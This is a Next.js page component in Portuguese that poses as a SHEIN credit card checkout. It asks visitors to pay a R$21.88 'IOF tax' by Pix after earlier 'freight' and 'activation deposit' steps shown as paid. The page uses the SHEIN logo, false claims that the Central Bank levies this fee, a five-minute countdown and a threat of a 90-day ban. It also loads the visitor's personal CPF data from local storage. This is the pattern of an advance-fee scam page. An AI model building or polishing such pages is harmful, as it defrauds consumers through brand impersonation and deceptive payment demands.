"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Copy, CheckCircle, Clock, Shield, ArrowLeft } from "lucide-react"

export default function UppThanksPage() {
  const [copied, setCopied] = useState(false)
  const [loading, setLoading] = useState(true)
  const [invoice, setInvoice] = useState(null)
  const [timeLeft, setTimeLeft] = useState(300) // 5 minutos
  const [userName, setUserName] = useState("")

  const router = useRouter()

  useEffect(() => {
    // Carregar dados do usuário
    const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
    setUserName(cpfData.nome?.split(" ")[0] || "")

    // Criar fatura IOF
    createIOFInvoice()
  }, [])

  // Timer countdown
  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => {
        setTimeLeft(timeLeft - 1)
      }, 1000)
      return () => clearTimeout(timer)
    }
  }, [timeLeft])

  const createIOFInvoice = async () => {
    try {
      setLoading(true)

      // Simular criação de fatura IOF
      const iofInvoice = {
        id: `IOF_${Date.now()}`,
        amount: 21.88,
        pix: {
          payload: `00020101021226580014br.gov.bcb.pix2536iof.payment.com/qr/v2/IOF${Date.now()}52040000530398654042188580BR5909SHEIN5011SAO PAULO62070503***6304IOFX`,
          qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(`00020101021226580014br.gov.bcb.pix2536iof.payment.com/qr/v2/IOF${Date.now()}52040000530398654042188580BR5909SHEIN5011SAO PAULO62070503***6304IOFX`)}`,
        },
      }

      setInvoice(iofInvoice)
      localStorage.setItem("iofInvoice", JSON.stringify(iofInvoice))
    } catch (error) {
      console.error("Erro ao criar fatura IOF:", error)
    } finally {
      setLoading(false)
    }
  }

  const copyPixCode = async () => {
    if (!invoice) return

    try {
      await navigator.clipboard.writeText(invoice.pix.payload)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch (error) {
      console.log("Erro ao copiar:", error)
    }
  }

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  if (loading) {
    return (
      <main className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full mx-4">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto mb-4"></div>
            <h2 className="text-xl font-bold mb-2">Processando...</h2>
            <p className="text-gray-600">Preparando última etapa</p>
          </div>
        </div>
      </main>
    )
  }

  return (
    <main className="min-h-screen bg-gray-50">
      <div className="max-w-md mx-auto p-4">
        <div className="bg-white rounded-2xl shadow-xl p-6">
          {/* Header with SHEIN Logo */}
          <div className="mb-6">
            <button onClick={() => router.back()} className="mb-4 p-2 text-gray-600 hover:text-gray-800">
              <ArrowLeft className="w-5 h-5" />
            </button>

            {/* SHEIN Logo */}
            <div className="text-center mb-6">
              <Image src="/shein-logo-updated.png" alt="SHEIN" width={120} height={40} className="mx-auto" priority />
            </div>

            <h1 className="text-2xl font-bold mb-2 text-gray-800">
              Parabéns, finalize a última etapa para concluir a sua solicitação
            </h1>
            <div className="w-16 h-1 bg-blue-500 mb-4"></div>

            <p className="text-gray-600 text-sm leading-relaxed">
              Você está a um passo de concluir o pedido do seu cartão de crédito. Ao solicitar a emissão do seu cartão
              de crédito ou a aprovação de um empréstimo, você estará sujeito à cobrança do Imposto sobre Operações
              Financeiras (IOF), que é regulamentado e emitido pelo Banco Central. Este imposto é aplicado para
              financiar operações financeiras e garantir a conformidade com as normas fiscais.
            </p>
          </div>

          {/* IOF Section */}
          <div className="bg-gray-50 rounded-xl p-4 mb-6">
            <h3 className="font-bold text-gray-800 mb-3">O que é o IOF?</h3>
            <p className="text-sm text-gray-600 mb-3">Aumente o volume 📢📢📢📢📢</p>

            {/* Video */}
            <div className="bg-black rounded-lg overflow-hidden mb-4">
              <video controls className="w-full h-48 object-cover" poster="/placeholder.svg?height=200&width=350">
                <source src="/emprestimo-facilitado-simulacao-gratuita.mp4" type="video/mp4" />
                Seu navegador não suporta o elemento de vídeo.
              </video>
            </div>
          </div>

          {/* Progress Steps with Custom Icons */}
          <div className="mb-6">
            <div className="space-y-4">
              {/* Pagamento Frete - Completed */}
              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center">
                  <CheckCircle className="w-5 h-5 text-white" />
                </div>
                <div className="flex-1">
                  <div className="flex items-center space-x-2">
                    <Image src="/favicon-frete.png" alt="Frete" width={24} height={16} className="object-contain" />
                    <span className="font-semibold text-green-700">Pagamento Frete</span>
                  </div>
                  <p className="text-sm text-green-600">Pagamento concluído com sucesso</p>
                </div>
              </div>

              {/* Depósito de Ativação - Completed */}
              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center">
                  <CheckCircle className="w-5 h-5 text-white" />
                </div>
                <div className="flex-1">
                  <div className="flex items-center space-x-2">
                    <Image src="/favicon-check.png" alt="Check" width={24} height={24} className="object-contain" />
                    <span className="font-semibold text-green-700">Depósito de Ativação</span>
                  </div>
                  <p className="text-sm text-green-600">Pagamento concluído com sucesso</p>
                </div>
              </div>

              {/* Pagamento do Imposto IOF - Current */}
              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center">
                  <Clock className="w-5 h-5 text-white" />
                </div>
                <div className="flex-1">
                  <div className="flex items-center space-x-2">
                    <Image src="/favicon-pix.png" alt="PIX" width={24} height={24} className="object-contain" />
                    <span className="font-semibold text-red-700">Pagamento do Imposto IOF</span>
                  </div>
                  <p className="text-sm text-red-600">Aguardando pagamento para liberação do cartão de crédito</p>
                </div>
              </div>

              {/* Cartão Virtual Liberado - Pending */}
              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center">
                  <div className="w-6 h-1 bg-gray-400 rounded"></div>
                </div>
                <div className="flex-1">
                  <div className="flex items-center space-x-2">
                    <Image
                      src="/favicon-card.png"
                      alt="Card"
                      width={24}
                      height={16}
                      className="object-contain opacity-50"
                    />
                    <span className="font-semibold text-gray-500">Cartão Virtual Liberado</span>
                  </div>
                  <p className="text-sm text-gray-400">Cartão físico em preparação</p>
                </div>
              </div>
            </div>
          </div>

          {/* Warning */}
          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
            <p className="text-sm text-yellow-800 text-center">
              O não pagamento do imposto resulta no cancelamento do pedido do cartão de crédito, impossibilitando uma
              nova contratação por um prazo <strong>máximo de 90 dias</strong>
            </p>
          </div>

          {/* Payment Section */}
          <div className="bg-white border-2 border-gray-200 rounded-xl p-6">
            <div className="text-center mb-4">
              <div className="flex items-center justify-center space-x-2 mb-2">
                <span className="text-lg font-bold">Pague via Pix</span>
                <Image src="/favicon-pix.png" alt="PIX" width={24} height={24} className="object-contain" />
              </div>
              <p className="text-sm text-gray-600">O pagamento será confirmado imediatamente</p>
            </div>

            {/* Amount */}
            <div className="text-center mb-6">
              <p className="text-4xl font-bold text-teal-600">R$ 21,88</p>
            </div>

            {/* QR Code */}
            {invoice && (
              <div className="text-center mb-6">
                <div className="bg-white p-4 rounded-lg border-2 border-gray-200 inline-block">
                  <Image
                    src={invoice.pix.qr_code || "/placeholder.svg"}
                    alt="QR Code PIX"
                    width={200}
                    height={200}
                    className="mx-auto"
                  />
                </div>
                <p className="text-sm text-gray-600 mt-2">Escaneie o QR Code com seu app do banco</p>
              </div>
            )}

            {/* PIX Code */}
            {invoice && (
              <div className="mb-6">
                <label className="block text-sm font-medium text-gray-700 mb-2">Ou copie o código PIX:</label>
                <div className="flex space-x-2">
                  <input
                    type="text"
                    value={invoice.pix.payload}
                    readOnly
                    className="flex-1 p-3 border border-gray-300 rounded-lg bg-gray-50 text-sm font-mono"
                  />
                  <button
                    onClick={copyPixCode}
                    className={`px-4 py-3 rounded-lg font-medium transition-colors ${
                      copied ? "bg-green-500 text-white" : "bg-gray-200 text-gray-700 hover:bg-gray-300"
                    }`}
                  >
                    {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                  </button>
                </div>
                {copied && <p className="text-green-600 text-sm mt-2">✅ Código copiado!</p>}
              </div>
            )}

            {/* Pay Button - BLACK with WHITE text as requested */}
            <button className="w-full bg-black text-white font-bold py-4 px-6 rounded-lg hover:bg-gray-800 transition-colors mb-4">
              Pagar agora
            </button>

            {/* Security */}
            <div className="flex items-center justify-center space-x-2 text-gray-600">
              <Shield className="w-4 h-4" />
              <span className="text-sm">Ambiente seguro</span>
            </div>
          </div>

          {/* Timer */}
          <div className="mt-6 text-center">
            <p className="text-sm text-gray-600">
              Tempo restante: <span className="font-bold text-red-600">{formatTime(timeLeft)}</span>
            </p>
          </div>
        </div>
      </div>
    </main>
  )
}
